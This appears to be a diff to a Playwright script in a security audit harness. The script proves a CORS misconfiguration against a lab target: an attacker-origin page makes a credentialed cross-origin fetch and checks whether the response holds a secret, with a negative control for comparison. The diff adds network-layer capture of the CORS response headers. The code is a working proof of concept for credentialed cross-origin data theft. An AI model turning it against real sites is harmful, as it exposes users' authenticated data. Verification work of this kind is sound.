@@ -15,8 +15,14 @@
 //   3. Fetch is a bare simple GET (no custom headers, no preflight/OPTIONS).
 //   4. negative_blocked is true ONLY when the in-page catch() received a TypeError
 //      (negative_threw:true) — NOT on empty/short body read.
-//   5. Browser-observed response headers (acao_seen, acac_true) emitted in result JSON
-//      for pass-through proof comparison against direct curl to http://autofyn-audit-target:8000.
+//   5. Wire-level ACAO/ACAC (`acao_seen`, `acac_true`) captured via Playwright's
+//      NETWORK-LAYER observation (`page.waitForResponse` + `response.allHeaders()`),
+//      which sees the actual HTTP response the browser received — NOT subject to
+//      JS-readability CORS restrictions. These are CORROBORATION; the PRIMARY proof
+//      is the behavioral differential (positive read succeeds + negative control throws).
+//      JS-side ACAO/ACAC (`js_acao_seen`, `js_acac_true`) are always null/false by
+//      CORS design (those headers are not CORS-safelisted; `resp.headers.get(...)` returns
+//      null cross-origin) — emitted for transparency only; NOT load-bearing.
 //   6. Same-origin authenticated-read de-risk gate: confirms secure cookie attaches
 //      over self-signed TLS before the cross-origin arm runs.
 
@@ -138,6 +144,8 @@ async function main() {
             negative_threw: false,
             acao_seen: null,
             acac_true: false,
+            js_acao_seen: null,
+            js_acac_true: false,
         });
         process.exit(0);
     }
@@ -267,6 +275,8 @@ async function main() {
             negative_threw: false,
             acao_seen: null,
             acac_true: false,
+            js_acao_seen: null,
+            js_acac_true: false,
         });
         process.exit(0);
     }
@@ -277,39 +287,100 @@ async function main() {
     const currentOrigin = await page.evaluate(() => window.location.origin);
     console.error(`[step-C] current page origin: ${currentOrigin}`);
 
-    // ── Step D: Positive — cross-origin credentialed fetch with header capture ─
+    // ── Step D: Positive — cross-origin credentialed fetch with wire header capture ─
     // BARE SIMPLE GET: credentials:include, no custom headers, no Content-Type
     // override. A simple GET triggers NO OPTIONS preflight — the proxy only
     // needs to relay the GET (no OPTIONS handling required).
-    console.error('[step-D] cross-origin credentialed fetch (positive)...');
+    //
+    // Wire-level ACAO/ACAC: captured via page.waitForResponse started concurrently
+    // with the in-page fetch. waitForResponse is scoped to AFTER navigation to the
+    // attacker page (Step C), so it captures the Step-D cross-origin response, NOT
+    // the Step-B same-origin one (which was issued earlier from a different page origin).
+    // Filter: URL matches whoami AND the response frame is the attacker-origin page.
+    //
+    // JS-side acao/acac (resp.headers.get(...)) are always null by CORS design —
+    // those headers are not CORS-safelisted; cross-origin JS cannot read them.
+    // Emitted as js_acao_seen / js_acac_true (informational only, not load-bearing).
+    console.error('[step-D] cross-origin credentialed fetch (positive) — wire capture via waitForResponse...');
+    console.error('[step-D] NOTE: JS-side ACAO/ACAC will be null by CORS design (not a failure).');
+
+    const WHOAMI_URL_JS = `${SECURE_TARGET_ORIGIN}/cors-protected/whoami`;
+
+    // Wire-level vars populated by waitForResponse
+    let wireAcao = null;
+    let wireAcac = false;
+
+    // Start waitForResponse BEFORE the evaluate so it does not miss the response.
+    // Filter: URL is whoami AND the request's frame is the attacker-origin page
+    // (guarantees we capture Step-D cross-origin, not Step-B same-origin).
+    const attacker_origin_prefix = ATTACKER_ORIGIN;
+    const wireResponsePromise = page.waitForResponse(
+        async (resp) => {
+            if (resp.url() !== WHOAMI_URL_JS) return false;
+            // Confirm the request came from the attacker-origin frame (cross-origin step D),
+            // not from the secure-target frame (same-origin step B).
+            try {
+                const frame = resp.frame();
+                const frameUrl = frame ? frame.url() : '';
+                return frameUrl.startsWith(attacker_origin_prefix);
+            } catch (_) {
+                return false;
+            }
+        },
+        { timeout: 15000 }
+    ).then(async (resp) => {
+        try {
+            const headers = await resp.allHeaders();
+            wireAcao = headers['access-control-allow-origin'] || null;
+            wireAcac = headers['access-control-allow-credentials'] === 'true';
+            console.error(`[step-D] wire ACAO: ${wireAcao}  wire ACAC: ${wireAcac}`);
+        } catch (err) {
+            console.error('[step-D] wire allHeaders() threw (response gone?):', err.message);
+            // Leave wireAcao null / wireAcac false — handled in verdict
+        }
+    }).catch((err) => {
+        console.error('[step-D] waitForResponse timed out or failed:', err.message);
+        // Leave wireAcao null / wireAcac false — handled in verdict
+    });
+
     const positiveResult = await page.evaluate(async (targetUrl) => {
         let status = null;
         let body = '';
-        let acao = null;
-        let acac = null;
+        let jsAcao = null;
+        let jsAcac = null;
         let threw = false;
         let errMsg = null;
         try {
             // Bare simple GET — no custom headers — no preflight
             const resp = await fetch(targetUrl, { credentials: 'include' });
             status = resp.status;
-            // Capture browser-observed CORS headers from the response
-            acao = resp.headers.get('access-control-allow-origin');
-            acac = resp.headers.get('access-control-allow-credentials');
+            // JS-side CORS header read — will be null by design (not a failure).
+            // These headers are not CORS-safelisted; cross-origin JS cannot read them.
+            jsAcao = resp.headers.get('access-control-allow-origin');
+            jsAcac = resp.headers.get('access-control-allow-credentials');
             body = await resp.text();
         } catch (e) {
             threw = true;
             errMsg = e.message || String(e);
         }
-        return { status, body, acao, acac, threw, errMsg };
-    }, `${SECURE_TARGET_ORIGIN}/cors-protected/whoami`);
+        return { status, body, jsAcao, jsAcac, threw, errMsg };
+    }, WHOAMI_URL_JS);
+
+    // Wait for the wire capture to settle (it was started before evaluate)
+    await wireResponsePromise;
 
     console.error('[step-D] positive result:', JSON.stringify(positiveResult));
+    console.error('[step-D] js_acao_seen (null by CORS design, informational only):', positiveResult.jsAcao);
+    console.error('[step-D] js_acac_true (false by CORS design, informational only):', positiveResult.jsAcac === 'true');
 
     const positiveRead = !positiveResult.threw && positiveResult.status === 200;
     const positiveBodyHasSecret = positiveResult.body.includes(EXFIL_SECRET);
-    const acaoSeen = positiveResult.acao || null;
-    const acacTrue = positiveResult.acac === 'true';
+    // Wire-observed ACAO/ACAC (from Playwright network layer — the real proof):
+    const acaoSeen = wireAcao;
+    const acacTrue = wireAcac;
+    // JS-side ACAO/ACAC (informational only — always null/false by CORS design):
+    const jsAcaoSeen = positiveResult.jsAcao || null;
+    const jsAcacTrue = positiveResult.jsAcac === 'true';
 
     // ── Step E: Negative — cross-origin fetch against non-CORS endpoint ────────
     // /no-cors-here is structurally identical to /whoami (same session-cookie gate,
@@ -351,8 +422,10 @@ async function main() {
         same_origin_gate_ok: sameOriginReadOk,
         positive_read: positiveRead,
         positive_body_has_secret: positiveBodyHasSecret,
-        acao_seen: acaoSeen,
-        acac_true: acacTrue,
+        acao_seen: acaoSeen,        // WIRE (Playwright allHeaders) — corroboration
+        acac_true: acacTrue,         // WIRE — corroboration
+        js_acao_seen: jsAcaoSeen,    // null by CORS design — informational only
+        js_acac_true: jsAcacTrue,    // false by CORS design — informational only
         negative_blocked: negativeBlocked,
         negative_threw: negativeThrew,
     };
@@ -373,6 +446,8 @@ main().catch((err) => {
         negative_threw: false,
         acao_seen: null,
         acac_true: false,
+        js_acao_seen: null,
+        js_acac_true: false,
     });
     process.exit(1);
 });
